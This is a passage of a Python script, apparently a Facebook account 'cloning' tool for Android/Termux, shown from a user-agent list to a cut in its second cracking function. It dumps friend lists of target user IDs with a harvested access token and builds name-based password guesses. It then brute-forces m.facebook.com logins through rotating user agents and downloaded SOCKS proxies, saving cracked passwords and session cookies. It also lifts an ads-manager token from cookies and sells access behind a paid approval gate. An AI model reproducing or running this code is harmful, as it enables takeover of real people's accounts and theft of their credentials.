	ua99='Mozilla/5.0 (Linux; Android 12; SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
	ua100='Mozilla/5.0 (Linux; Android 13; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
	ff = random.choice([ua1,ua2,ua3,ua4,ua5,ua6,ua7,ua8,ua9,ua10,ua11,ua12,ua13,ua14,ua15,ua16,ua17,ua18,ua19,ua20,ua21,ua22,ua23,ua24,ua25,ua26,ua27,ua28,ua29,ua30,ua31,ua32,ua33,ua34,ua35,ua36,ua37,ua38,ua39,ua40,ua41,ua42,ua43,ua44,ua45,ua46,ua47,ua48,ua49,ua50,ua51,ua52,ua53,ua54,ua55,ua56,ua57,ua58,ua59,ua60,ua61,ua62,ua63,ua64,ua65,ua66,ua67,ua68,ua69,ua70,ua71,ua72,ua73,ua74,ua75,ua76,ua77,ua78,ua79,ua80,ua81,ua82,ua83,ua84,ua85,ua86,ua87,ua88,ua89,ua90,ua91,ua92,ua93,ua94,ua95,ua96,ua97,ua98,ua99,ua100])
	ugen.append(ff)
import os, platform, time, sys
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('pip install httpx pip install beautifulsoup4')
os.system('pip install requests ')
os.system("pkg install espeak")
cokbrut=[]
ses=requests.Session()
prinCP=[]
try:
    prox = requests.get('https://raw.githubusercontent.com/BlackFF444/Api/main/prox.txt').text
    open('.prox.txt', 'w').write(prox)
except:
    print('Internet Error')
    sys.exit()

xvx = open('.prox.txt', 'r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

#------------[ APK- ]--------------#
def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r  {BG}[{W}•{BG}] {W}SORRY THERE IS NO ACTIVE APK{E}')
	else:
		print(f'\r{BG}  [{W}•{BG}]{W} YOUR ACTIVE APPLICATION DETAILS{E} ')
		for i in range(len(game)):
			print(f"\r%s  [%s] %s %s "%(G,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),E))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r{BG}  [{W}•{BG}]{W} SORRY THERE IS NO EXPIRED APK{W}')
	else:
		print(f'\r  {BG}[{W}•{BG}]{W} YOUR EXPIRED APPLICATION DETAILS{E}')
		for i in range(len(game)):
			print(f"\r%s  [%s] %s %s "%(S,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),E))
#------------[ APK- ]--------------#
#------------[ HEART- ]--------------#

 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[38;5;50m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
 
###----------[ ANSII COLOR STYLE ]---------- ###
 
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
 
###----------[ RICH COLOR STYLE ]---------- ###
 
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu
 
#--------------------[ CONVERTER-BULAN ]--------------#
 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
CPc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def TUTULj(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
#------------------[ MAIN ]-----------------#
#------------------[ MACHINE-SUPPORT ]---------------#
 
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
    os.system('clear')
def back():
    login()
def contact():
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
logo ="""
   ___   __    _    __  _   
  / o.) / /  .' \ ,'_/ / //7
 / o \ / /_ / o // /_ /  ,' 
/___,'/___//_n_/ |__//_/\\  

"""                                
balpakna =("""\x1b[38;5;50m══════════════════════════════════════════════════""")    
meyermarexudi =(""" \033[0;97m=============================================""")    
alltimexudi =(""" \033[32;1m[-] ONLY APPROVAL SYSTEM 7 DEYS 150TK 30 500TK FOR    APPROVAL""")
xudartimenai =(""" \033[32;1m[+] CONTACT ADMIN PLZ ENTAR""")

                  #____APPROVAL SYSTEM ADD_____#
def meyexudi():
  os.system('clear')
  print(logo)
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/BlackFF444/Api/blob/main/Approval.txt').text
    if id in httpCaht:
      msg = str(os.geteuid())
      print()
      pass
    else:
      print(' \x1b[38;5;208m╔══[𝟷]💥  FREE-FIRE-TIK-TOK- ID CLONING')      
      print(' \x1b[1;98m║══[𝟸]💥  ONLY ACTIVE ID CLONE 100%')
      print(' \x1b[1;93m║══[𝟸]💥  CP ID WILL BE LOGIN 80%')
      print(' \x1b[1;97m║══[𝟸]💥  WI-FI  AND DATA BOTH WORKING 100%')
      print(' \x1b[1;95m║══[𝟸]💥  15 DAY 250 TAKA ')
      print(' \x1b[38;5;50m║══[𝟸]💥  30 DAY 500 TAKA ')
      os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   MR,   BLACK,    Please,   Send,   Your,   Key,"')
      print(" \x1b[0m║══[𝟸] YOUR KEY : "+id)
      input(' \033[1;30m╚══[𝟹] IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801309177411?text='+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
meyexudi()
def naima():
	print('-------------------')
uname =input('\033[1;91m[\033[1;91m•\033[1;91m]\033[1;33m WHAT IS YOUR NAME \033[1;91m: \33[1;31m')
os.system('clear')
def back():
	login()
	import getpass

attemps = 0

while attemps < 12345677901:
    username = input('\033[1;91m[\033[1;92m√\033[1;91m]\x1b[38;5;50m ENTER USERNAME: ')
    password = input('\033[1;95m[\033[1;95m√\033[1;95m]\x1b[38;5;50m ENTER PASSWORD: ')

    if username == 'V' and password == '7':
        print(' \033[0;95mYou Have Successfully Logged in.')
        break
    else:
        print(' Incorrect Pass Please Trying ')
        attemps += 1
        continue
os.system('clear')
pass
 
 
def login():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2,sy3)
        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            print('\033[0;97m=================')
            animation(' [×] NO INTERNET CONNECTION DETECTED')
            exit()
    except IOError:
        login_lagi334()
def login_lagi334():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2,sy3)
        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            print('\033[0;97m=================')
            animation(' [×] NO INTERNET CONNECTION DETECTED')
            exit()
    except IOError:
        login_lagi334()
def login_lagi334():
    try:
        os.system('clear')
        print(logo)
        ses = requests.Session()
        cookies = {'cookie':cookie}
        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
        req = ses.get(url,cookies=cookies)
        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
        nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
        roq = ses.get(nek,cookies=cookies)
        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
        tokenw = open(".token.txt", "w").write(tok)
        cokiew = open(".cok.txt", "w").write(cookie)
      #exit()
    except Exception as e:
        os.system("rm -f .token.txt")
        os.system("rm -f .cok.txt")
        os.system("python FX.py")
        exit()

#------------------[ MENU ]----------------#
 #===©===#
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.040)
def menu():
    os.system('clear')
    print(logo)
    print(f"\033[95;1m[\033[95;1m+\033[95;1m] \033[1;95m𝐔𝐒𝐄𝐑 𝐍𝐀𝐌𝐄\033[1;91m :\033[1;96m "+uname)
    print("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;96m "+date)
    print('\033[0;97m===============================================')
    print(f"""\033[91;1m[\033[92;1m1\033[91;1m] \033[0;91m𝗙𝗜𝗟𝗘 𝗖𝗟𝗢𝗡𝗜𝗡𝗚         """)
    print("""\033[95;1m[\033[95;1m2\033[95;1m] \033[0;95m𝗖𝗢𝗡𝗧𝗔𝗖𝗧 ᏔᏆͲᎻ 𝗔𝗗𝗠𝗜𝗡""")
    print(f"""\033[93;1m[\033[93;1m3\033[93;1m] \033[93;1m𝗖𝗛𝗘𝗖𝗞 ϴᏦ 𝗜𝗗𝘇   """)
    print("""\033[98;1m[\033[98;1m0\033[98;1m] \033[0;98mᎬХᏆͲ""")
    print('\033[0;97m=================')
    HEART = input('\x1b\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE: ')
    if HEART in ['111']:
        login()
        dump_massal()
    elif HEART in ['1']:
        crack_file()
    elif HEART in ['2','02']:
        os.system('xdg-open https://github.com/Mr-Alon')
        os.system("python FX.py")
    elif HEART in ['3','03']:
        result()
    elif HEART in ['0']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print('\033[0;97m=================')
        animation(' [×] DONE EXIT ')
        exit()
    else:
        print('\033[0;97m=================')
        animation(' [×] SELECT CORRECTLY ')
        back()
 
      #-----------------[ HASIL-CRACK ]-----------------#
 
def result():
    os.system('clear')
    print(logo)
    print(' \033[96;1m[\033[96;1m1\033[96;1m] CHECK CP IDZ ')
    print(' \033[95;1m[\033[95;1m2\033[95;1m] CHECK OK IDZ ')
    print(' \033[94;1m[\033[94;1m3\033[94;1m] EXIT ')
    print('\033[0;91m==================')
    kz = input(' \033[95;1m[\033[95;1m•\033[95;1m]CHOOSE : ')
    if kz in ['1','01']:
        try:vin = os.listdir('CP')
        except FileNotFoundError:
            print('\033[0;91m==================')
            animation(' \033[96;1m[\033[92;1m•\033[976;1m] FILE NOT FOUND ')
            time.sleep(3)
            back()
        if len(vin)==0:
            print('\033[0;91m==================')
            animation(' \033[95;1m[\033[95;1m•\033[95;1m] NO CP RESULTS FOUND ')
            time.sleep(2)
            back()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:hem = open('CP/'+isi,'r').readlines()
                except:continue
                cih+=1
                if cih<10:
                    nom = ''+str(cih)
                    lol.update({str(cih):str(isi)})
                    lol.update({nom:str(isi)})
                    print('\033[0;91m==================')
                    print(' '+nom+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
                else:
                    lol.update({str(cih):str(isi)})
                    print(' '+str(cih)+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
            print('\033[0;91m==================')
            geeh = input(' \033[95;1m[\033[95;1m•\033[95;1m] CHOOSE : ')
            print('\033[0;91m==================')
            try:geh = lol[geeh]
            except KeyError:
                print('\033[0;91m==================')
                animation(' \033[95;1m[\033[92;1m•\033[95;1m] NO OPTION FOUND ')
                exit()
            try:lin = open('CP/'+geh,'r').read().splitlines()
            except:
                print('\033[0;91m==================')
                animation(' \033[95;1m[\033[92;1m•\033[95;1m] FILE NOT FOUND ')
                time.sleep(2)
                back()
            nocp=0
            for cpku in range(len(lin)):
                cpkuni=lin[nocp].split('|')
                print(f' \033[95;1m[\033[92;1m•\033[95;1m] CP : \033[35m {cpkuni[0]}|{cpkuni[1]}\033[0m')
                nocp +=1
            print('\033[0;95m==================')
            input('\033[97;1m[\033[92;1m•\033[97;1m] PRESS ENTER TO BACK ')
            back()
    elif kz in ['2','02']:
        try:vin = os.listdir('OK')
        except FileNotFoundError:
            print('\033[0;91m==================')
            animation(' \033[95;1m[\033[92;1m•\033[95;1m] FILE NOT FOUND ')
            time.sleep(2)
            back()
        if len(vin)==0:
            print('\033[0;91m==================')
            animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO OK RESULTS FOUND ')
            time.sleep(2)
            back()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:hem = open('OK/'+isi,'r').readlines()
                except:continue
                cih+=1
                if cih<100:
                    print('\033[0;95m==================')
                    nom = ''+str(cih)
                    lol.update({str(cih):str(isi)})
                    lol.update({nom:str(isi)})
                    print(' '+nom+'. '+isi+'\033[35m '+str(len(hem))+' \033[0m OK '+x)
                else:
                    lol.update({str(cih):str(isi)})
                    print(' '+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)
            print('\033[0;93m==================')
            geeh = input(' \x1b[1;92m [•] CHOOSE : ')
            print('\033[0;93m==================')
            try:geh = lol[geeh]
            except KeyError:
                print('\033[0;93m==================')
                animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO OPTION FOUND ')
                exit()
            try:lin = open('OK/'+geh,'r').read().splitlines()
            except:
                print('\033[0;91m==================')
                animation(' \033[97;1m[\033[92;1m•\033[97;1m] FILE NOT FOUND ')
                time.sleep(2)
                back()
            nocp=0
            for cpku in range(len(lin)):
                cpkuni=lin[nocp].split('|')
                print(f'\033[95;1m[\033[92;1m•\033[95;1m] OK : \033[35m {cpkuni[0]}|{cpkuni[1]}\033[0m')
                nocp +=1
            print('\033[0;91m==================')
            input('\033[95;1m[\033[92;1m•\033[95;1m] PRESS ENTER TO BACK ')
            back()
    elif kz in ['0','00']:
        back()
    else:
        print('\033[0;91m==================')
        animation(' \033[95;1m[\033[92;1m•\033[95;1m] NO OPTION FOUND IN MENU')
        exit()
 
#-------------------[ CRACK-PUBLIK ]----------------#
 
def dump_massal():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
    except IOError:
        exit()
    try:
        print('\033[0;91m==================')
        jum = int(input(' \033[95;1m[\033[92;1m•\033[95;1m] ENTER TARGET AMOUNT  : '))
        print('\033[0;91m==================')
    except ValueError:
        print('\033[0;91m==================')
        animation(' [×] INVALID OPTION ')
        exit()
    if jum<1 or jum>100000000:
        print('\033[0;91m==================')
        animation(' [×] TRY AGAIN ')
        exit()
    ses=requests.Session()
    yz = 0
    for met in range(jum):
        yz+=1
        kl = input(' \033[97;1m[\033[92;1m•\033[95;1m] INPUT UID '+str(yz)+' : ')
        uid.append(kl)
    for userr in uid:
        try:
            col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
            for mi in col['friends']['data']:
                try:
                    iso = (mi['id']+'|'+mi['name'])
                    if iso in id:pass
                    else:id.append(iso)
                except:continue
        except (KeyError,IOError):
            pass
        except requests.exceptions.ConnectionError:
            print('\033[0;95m==================')
            animation(' [×] TRY AGAIN ')
            os.system('clear')
    try:
        print('\033[0;91m==================')
        print(f' \033[92;1m[\033[92;1m•\033[92;1m] TOTAL ID : \u001b[36m'+str(len(id))+'\033[1;37m')
        setting()
    except requests.exceptions.ConnectionError:
        print(f'{u}')
        back()
    except (KeyError,IOError):
        print('\033[0;91m==================')
        animation(" [×] DUMP ID FAILED ")
        time.sleep(3)
        back()
 
#-------------[ CRACK-FROM-FILE ]------------------#
 
def crack_file():
    print('\033[0;93m==================')
    print('\033[1;36m[ Put File Example:  /sdcard/king.txt  Etc...]')
    o = input('\033[95;1m[\033[92;1m+\033[95;1m] INPut FILE NAME :\033[95;1m ')
    try:lin = open(o).read().splitlines()
    except:
        print('\033[0;98m==================')
        animation(' [×] FILE NOT FOUND')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting()
 
#-------------[ PENGATURAN-IDZ ]---------------#
 
def setting():
    print('\033[0;91m=============================')
    print("\033[95;1m[\033[95;1m1\033[95;1m] \033[0;95mCLONING FOR ONLY 𝐎𝐋𝐃 IDz")
    print("\033[98;1m[\033[98;1m2\033[98;1m] \033[0;98mCLONING FOR ONLY 𝐍𝐄𝐖 IDz")
    print("\033[91;1m[\033[91;1m3\033[91;1m] \033[0;91mCLONING FOR 𝐌𝐈𝐗 IDz")
    print('\033[0;91m=============================')
    hu = input('\033[95;1m[\033[92;1m+\033[95;1m]CHOOSE :\033[95;1m ')
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2','02']:
        muda=[] 
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    print('\033[0;91m==================')
    print('\033[0;91m==================')
    print("\033[98;1m[\033[98;1m1\033[98;1m] METHOD 1 [\035𝐍𝐞𝐰 𝐕𝐞𝐫𝐬𝐢𝐨𝐧\033[1;37m]")
    print("\033[93;1m[\033[93;1m2\033[93;1m] METHOD 2 [\034𝐎𝐥𝐝 𝐕𝐞𝐫𝐬𝐢𝐨𝐧\033[1;37m]")
    print('\033[0;91m==================')
    hc = input('\033[95;1m[\033[92;1m•\033[95;1m] CHOOSE : ')
    if hc in ['1','01']:
        method.append('mobile')
    elif hc in ['2','02']:
        method.append('free')
    else:
        method.append('mobile')
    passwrd()
    exit() 
 
#-------------------[ BAGIAN-WORDLIST ]------------#
 
def passwrd():
    os.system('clear')
    print(logo)
    print(f"\033[1;91m[\033[1;91m√\033[1;91m] \033[1;91m𝐘𝐎𝐔𝐑 𝐓𝐎𝐎𝐋𝐒 𝙰𝙲𝚃𝙸𝚅𝙴 \x1b[38;5;50m[𝙿𝚁𝙴𝙼𝙸𝚄𝙼] ")
    print(f"\033[1;91m[\033[1;91m√\033[1;91m] \033[1;91m𝐔𝐒𝐄𝐑𝐒 𝐍𝐀𝐌𝐄\033[1;91m :\033[1;96m "+𝚞𝚗𝚊𝚖𝚎)
    print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;95m𝗧𝗢𝗗𝗔𝗬'𝗦 𝙳𝙰𝚃𝙴 :\x1b[38;5;50m "+𝚍𝚊𝚝𝚎)
    print('\033[1;91m[\033[1;92m√\033[1;91m] \033[1;93m𝚈𝙾𝚄𝚁 TOTAL 𝙸𝙳𝚣 \033[0;97m:\x1b[38;5;50m ',str(len(id)))
    print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;95m𝗦𝗧𝗔𝗥𝗧𝗘𝗗 𝗬𝗢𝗨𝗥 𝗖𝗟𝗢𝗡𝗜𝗡𝗚 𝗧𝗜𝗠𝗘 \033[0;97m :> \x1b[38;5;50m"+time.strftime("%H:%M")+" "+ tag)
    print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;91m𝐂𝐋𝐎𝐍𝐈𝐍𝐆 𝐒𝐏𝐄𝐄𝐃 𝐒𝐔𝐏𝐄𝐑 𝐅𝐀𝐒𝐓 ⏩")
    print(f'\033[1;91m[\033[1;92m√\033[1;91m] \033[1;98m𝐔𝐒𝐄=[𝐅𝐋𝐈𝐆𝐇𝐓 𝐌𝐎𝐃𝐄 𝙵𝙾𝚁 𝚂𝙿𝙴𝙴𝙳 𝚄𝙿💙] ')
    print('\x1b[38;5;50m===============================================')
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:                
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')
                    pwv.append(frs+'1234@#')
                    pwv.append(frs+'123456@#')                    
                    pwv.append(nmf)
                    pwv.append(frs+'@12')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@1234')
                    pwv.append(frs+'@12345')
                    pwv.append(frs+'@123456')
                    pwv.append(frs+'@11223344')
                    pwv.append(frs+'@1122')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'@@@@')
                    pwv.append(frs+'@#')                   
                    pwv.append(frs+'11')
                    pwv.append(frs+'420')
                    pwv.append(frs+'444')
                    pwv.append(frs+'111')
                    pwv.append(frs+'444@#')
                             
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')
                    pwv.append(frs+'1234@#')
                    pwv.append(frs+'123456@#')                    
                    pwv.append(nmf)
                    pwv.append(frs+'@12')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@1234')
                    pwv.append(frs+'@12345')
                    pwv.append(frs+'@123456')
                    pwv.append(frs+'@11223344')
                    pwv.append(frs+'@1122')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'@@@@')
                    pwv.append(frs+'@#')                   
                    pwv.append(frs+'11')
                    pwv.append(frs+'420')
                    pwv.append(frs+'444')
                    pwv.append(frs+'111')
                    pwv.append(frs+'444@#')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'touch' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crackfree,idf,pwv)
            else:
                pool.submit(crackfree,idf,pwv)
    print('\n\033[1;37m===================================')
    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
    print('\033[97;1m[\033[92;1m•\033[95;1m] OK :\033[0;92m %s '%(ok))
    print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s '%(cp))
    print('\n\033[1;37m===================================')
    woi = input('\033[97;1m[\033[92;1m+\033[95;1m] \033[1;37m ENTER TO BACK')
    os.system("python FX.py")
    exit() 
#--------------------[ METODE-B-API ]-----------------#
 
def crack(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\033[100;95m{bo}[BLACK 🔍•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ses = requests.Session()
    ua = random.choice(ugen)
    for pw in pwv:
        try:
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[BLACK-Cp🌺]✅Uid┏━➤ {idf} 🔑Pass┏━➤{pw}')
                print(ua)
                open('/sdcard/BLACK-CP.txt', 'a').write( idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[0;96m[BLACK-Ok🌸] ✅Uid┏━➤ {idf} 🔑Pass┏━➤ {pw}\n\033[0;91m[🌼]= COOKIES • \033[0;91m{kuki} ')
                cek_apk(session,coki)
                print(ua)
                os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
                open('/sdcard/BLACK-OK.txt', 'a').write( idf+' • '+pw+' | '+kuki+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(50)
    loop+=1
 
#------------------[ METHODE-MBASIC-2 ]-------------------#
 
def crackfree(idf,pwv):
    global loop,ok,cp
    global xvx
    sys.stdout.write(f"\r{H}[BLACK 🔍-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ses = requests.Session()
    ua = (usa)
    for pw in pwv:
        try:
            prox=random.choice(xvx)
            bro={"http":"socks4://"+prox}
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":uaku(),"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
